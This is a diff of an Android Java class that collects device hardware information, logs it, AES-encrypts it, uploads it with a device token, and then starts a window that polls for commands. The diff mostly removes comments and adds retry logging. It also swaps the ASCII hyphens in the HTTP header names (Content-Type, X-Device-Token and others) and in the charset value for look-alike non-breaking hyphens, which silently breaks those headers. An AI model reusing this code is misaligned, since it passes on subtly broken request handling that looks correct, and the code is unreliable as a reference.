@@ -4,9 +4,7 @@ import android.content.Context;
 import android.os.Handler;
 import android.os.Looper;
 import android.util.Log;
-
 import org.json.JSONObject;
-
 import java.io.BufferedReader;
 import java.io.InputStream;
 import java.io.InputStreamReader;
@@ -32,7 +30,6 @@ public final class DeviceUploader {
     // ================= 开始一轮上传 =================
     public static void send(Context context, Callback callback) {
         final Context app = context.getApplicationContext();
-
         LogManager.log(app, LogManager.SUB_UPLOAD, "DeviceUploader.send() 被触发，准备执行上报");
 
         if (!RUNNING.compareAndSet(false, true)) {
@@ -61,26 +58,24 @@ public final class DeviceUploader {
                 while (baseUrl.endsWith("/")) {
                     baseUrl = baseUrl.substring(0, baseUrl.length() - 1);
                 }
-
                 URL url = new URL(baseUrl + API_PATH);
 
-                // 【每次send都重新采集最新全套设备硬件信息】
+                // 采集设备信息payload
                 JSONObject payload = DeviceInfo.collect(app);
                 payload.put("device_id", deviceId);
                 payload.put("upload_timestamp", System.currentTimeMillis());
 
-                // 新增日志：打印本次实际要上传的JSON（排查重点！看日志就能知道采集出来有没有cpu/蓝牙/电量）
                 String debugPayload = payload.toString();
                 LogManager.log(app, LogManager.SUB_UPLOAD, "本次上报payload内容：" + debugPayload);
 
-                // ========== AES 加密开始 ==========
+                // AES加密
                 String jsonStr = debugPayload;
                 String[] aesRet = AesUtil.encrypt(jsonStr);
                 String encBody = aesRet[0];
                 String ivBase64 = aesRet[1];
                 byte[] body = encBody.getBytes(StandardCharsets.UTF_8);
-                // ========== AES 加密结束 ==========
 
+                // 循环重试
                 for (int attempt = 1; attempt <= MAX_ATTEMPTS; attempt++) {
                     HttpURLConnection connection = null;
                     try {
@@ -94,11 +89,11 @@ public final class DeviceUploader {
                         connection.setUseCaches(false);
                         connection.setInstanceFollowRedirects(false);
 
-                        connection.setRequestProperty("Content-Type", "text/plain; charset=utf-8");
+                        connection.setRequestProperty("Content‑Type", "text/plain; charset=utf‑8");
                         connection.setRequestProperty("Accept", "application/json");
-                        connection.setRequestProperty("X-Device-Token", token);
-                        connection.setRequestProperty("X-Device-Id", deviceId);
-                        connection.setRequestProperty("X-Aes-Iv", ivBase64);
+                        connection.setRequestProperty("X‑Device‑Token", token);
+                        connection.setRequestProperty("X‑Device‑Id", deviceId);
+                        connection.setRequestProperty("X‑Aes‑Iv", ivBase64);
                         connection.setRequestProperty("User‑Agent", "ScreenWake/1.0");
 
                         connection.setFixedLengthStreamingMode(body.length);
@@ -113,8 +108,6 @@ public final class DeviceUploader {
                             success = true;
                             finalMessage = "上传成功，HTTP " + code;
                             LogManager.log(app, LogManager.SUB_UPLOAD, "设备信息上传成功，HTTP " + code + "，第 " + attempt + " 次成功");
-
-                            // 上传成功后开启指令轮询窗口
                             CommandPoller.startWindow(app);
                             break;
                         } else {
@@ -137,10 +130,13 @@ public final class DeviceUploader {
 
                     if (!success && attempt < MAX_ATTEMPTS) {
                         try {
-                            Thread.sleep(attempt * 2000L);
+                            long sleepMs = attempt * 2000L;
+                            LogManager.log(app, LogManager.SUB_UPLOAD, "等待 " + sleepMs + "ms 后进行下一次重试");
+                            Thread.sleep(sleepMs);
                         } catch (InterruptedException e) {
                             Thread.currentThread().interrupt();
                             finalMessage = "上传任务被中断";
+                            LogManager.log(app, LogManager.SUB_UPLOAD, finalMessage);
                             break;
                         }
                     }
@@ -176,7 +172,8 @@ public final class DeviceUploader {
                 }
                 result.append(line);
             }
-        } catch (Exception ignored) {}
+        } catch (Exception ignored) {
+        }
         return result.toString();
     }
 
@@ -190,5 +187,6 @@ public final class DeviceUploader {
         return RUNNING.get();
     }
 }
+
 
 
